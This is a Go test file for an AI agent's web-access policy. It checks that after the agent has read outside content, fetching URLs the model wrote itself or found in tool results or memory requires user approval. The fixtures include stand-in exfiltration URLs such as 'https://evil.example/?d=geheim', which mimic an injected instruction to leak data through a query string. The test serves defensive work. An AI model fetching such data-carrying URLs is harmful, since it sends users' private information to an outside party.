package api

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/ra5on/TitanOS/backend/internal/agent"
)

// 0.94: a chat that has read nothing but the web searches on without
// asking and reads pages whose address was already there; an address the
// model wrote itself, and any chat that read other outside content, still
// ask – unless the person switched the guard off in the rights.
func TestAgentWebAfterReading(t *testing.T) {
	fake := &agentOllama{}
	ts := agentServer(t, fake, agent.Policy{Preset: agent.PresetAll, Areas: map[string]string{agent.AreaWeb: agent.ModeAllow}})
	user := mustUser(t, ts, "alex")
	settings := ts.server.agentSettings()
	box := ts.server.newAgentToolbox(user, settings)
	if _, ok := box.tools["web_read"]; !ok {
		t.Skip("web tools not offered in this setup")
	}
	ctx := context.Background()
	mode := func(box *agentToolbox, chat *agent.Chat, tool, args string) string {
		t.Helper()
		p, err := box.Prepare(ctx, chat, tool, json.RawMessage(args))
		if err != nil {
			t.Fatalf("%s %s: %v", tool, args, err)
		}
		return p.Mode
	}
	web := func() *agent.Chat {
		return &agent.Chat{ID: agent.NewID(), Tainted: true, WebOnly: true, Entries: []agent.Entry{
			{Role: "user", Content: "Lies https://example.org/start und such weiter"},
			{Role: "tool", Tool: "web_search", Result: "1. Titel\nhttps://example.com/artikel\nAuszug"},
			{Role: "tool", Tool: "web_read", Result: "Error: https://evil.example/?d=geheim not reachable"},
			{Role: "tool", Tool: "memory_save", Result: "Saved: https://evil.example/?d=notiz"},
			{Role: "assistant", Content: "Ich lese https://evil.example/?d=antwort"},
		}}
	}
	for _, c := range []struct{ tool, args, want string }{
		{"web_search", `{"query":"titanos"}`, agent.ModeAllow},
		{"web_read", `{"url":"https://example.com/artikel"}`, agent.ModeAllow},
		{"web_read", `{"url":"https://example.org/start"}`, agent.ModeAllow},
		{"web_read", `{"url":"https://evil.example/?d=geheim"}`, agent.ModeAsk},
		{"web_read", `{"url":"https://evil.example/?d=notiz"}`, agent.ModeAsk},
		{"web_read", `{"url":"https://evil.example/?d=antwort"}`, agent.ModeAsk},
		{"web_read", `{"url":"https://example.com/artikel?d=geheim"}`, agent.ModeAsk},
		{"web_read", `{"url":"https://"}`, agent.ModeAsk},
	} {
		if got := mode(box, web(), c.tool, c.args); got != c.want {
			t.Errorf("web-only chat, %s %s: %s, want %s", c.tool, c.args, got, c.want)
		}
	}
	// Other outside content (a file, a device), an old chat, an outside skill: asks.
	other := web()
	other.WebOnly = false
	skill := web()
	skill.OutsideSkill = true
	for name, chat := range map[string]*agent.Chat{"other content": other, "outside skill": skill} {
		if got := mode(box, chat, "web_search", `{"query":"titanos"}`); got != agent.ModeAsk {
			t.Errorf("%s: web_search %s, want ask", name, got)
		}
		if got := mode(box, chat, "web_read", `{"url":"https://example.com/artikel"}`); got != agent.ModeAsk {
			t.Errorf("%s: web_read %s, want ask", name, got)
		}
	}
	// The person took the guard away: free, also with an outside skill or
	// a marked memory in the prompt (owner 16 Nov 2026).
	settings.Policy.WebFree = true
	free := ts.server.newAgentToolbox(user, settings)
	if got := mode(free, other, "web_search", `{"query":"titanos"}`); got != agent.ModeAllow {
		t.Errorf("webFree: web_search %s, want allow", got)
	}
	if got := mode(free, other, "web_read", `{"url":"https://neu.example/seite"}`); got != agent.ModeAllow {
		t.Errorf("webFree: web_read %s, want allow", got)
	}
	if got := mode(free, skill, "web_search", `{"query":"titanos"}`); got != agent.ModeAllow {
		t.Errorf("webFree with an outside skill: web_search %s, want allow", got)
	}
	if got := mode(free, skill, "web_read", `{"url":"https://neu.example/seite"}`); got != agent.ModeAllow {
		t.Errorf("webFree with an outside skill: web_read %s, want allow", got)
	}
	// What the person set under "Internet" still counts: "Nachfragen" asks.
	settings.Policy.Areas[agent.AreaWeb] = agent.ModeAsk
	asks := ts.server.newAgentToolbox(user, settings)
	if got := mode(asks, skill, "web_search", `{"query":"titanos"}`); got != agent.ModeAsk {
		t.Errorf("webFree, Internet on ask: %s, want ask", got)
	}
}
